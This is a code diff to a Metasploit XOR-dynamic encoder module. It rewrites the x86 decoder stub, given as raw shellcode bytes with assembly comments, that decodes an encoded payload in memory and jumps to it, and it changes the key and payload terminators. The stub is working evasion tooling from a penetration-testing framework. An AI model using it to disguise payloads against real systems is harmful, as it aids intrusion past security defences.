@@ -16,35 +16,33 @@ class MetasploitModule < Msf::Encoder::XorDynamic
   end
 
   def stub
-    "\xeb\x28" +              #         jmp   _call
-    "\x59" +                  # _ret:   pop   ecx
-    "\x89\xcb" +              #         mov   ebx, ecx
-    "\x89\xde" +              #         mov   esi, ebx
-    "\x80\x39\x61" +          # _lp1:   cmp   BYTE PTR [ecx], 'a'
-    "\x74\x03" +              #         je    _ok
-    "\x41" +                  #         inc   ecx
-    "\xeb\xf8" +              #         jmp   _lp1
-    "\x41" +                  # _ok:    inc   ecx
-    "\x89\xcf" +              #         mov   edi,ecx
-    "\x66\x81\x39\x62\x62" +  # _lp:    cmp   WORD PTR [ecx], 'bb'
-    "\x74\x0f" +              #         je    _jmp
-    "\x8a\x03" +              #         mov   al,BYTE PTR [ebx]
-    "\x30\x01" +              #         xor   BYTE PTR [ecx], al
-    "\x41" +                  #         inc   ecx
-    "\x43" +                  #         inc   ebx
-    "\x80\x3b\x61" +          #         cmp   BYTE PTR [ebx], 'a'
-    "\x75\xee" +              #         jne   _lp
-    "\x89\xf3" +              #         mov   ebx, esi
-    "\xeb\xea" +              #         jmp   _lp
-    "\xff\xe7" +              # _jmp:   jmp   edi
-    "\xe8\xd3\xff\xff\xff"    # _call:  call  _ret
+    "\xeb\x23" +             #        jmp    _call
+    "\x5b" +                 # _ret:  pop    ebx
+    "\x89\xdf" +             #        mov    edi, ebx
+    "\xb0\x41" +             #        mov    al, 'A'
+    "\xfc" +                 #        cld
+    "\xae" +                 # _lp1:  scas   al, BYTE PTR es:[edi]
+    "\x75\xfd" +             #        jne    _lp1
+    "\x89\xf9" +             #        mov    ecx, edi
+    "\x89\xde" +             # _lp2:  mov    esi, ebx
+    "\x8a\x06" +             # _lp3:  mov    al, BYTE PTR [esi]
+    "\x30\x07" +             #        xor    BYTE PTR [edi], al
+    "\x47" +                 #        inc    edi
+    "\x66\x81\x3f\x42\x42" + #        cmp    WORD PTR [edi], 'BB'
+    "\x74\x08" +             #        je     _jmp
+    "\x46" +                 #        inc    esi
+    "\x80\x3e\x41" +         #        cmp    BYTE PTR [esi], 'A'
+    "\x75\xee" +             #        jne    _lp3
+    "\xeb\xea" +             #        jmp    _lp2
+    "\xff\xe1" +             # _jmp:  jmp    ecx
+    "\xe8\xd8\xff\xff\xff"   # _call: call   _ret
   end
 
   def stub_key_term
-    /a/
+    /A/
   end
 
   def stub_payload_term
-    /bb/
+    /BB/
   end
 end
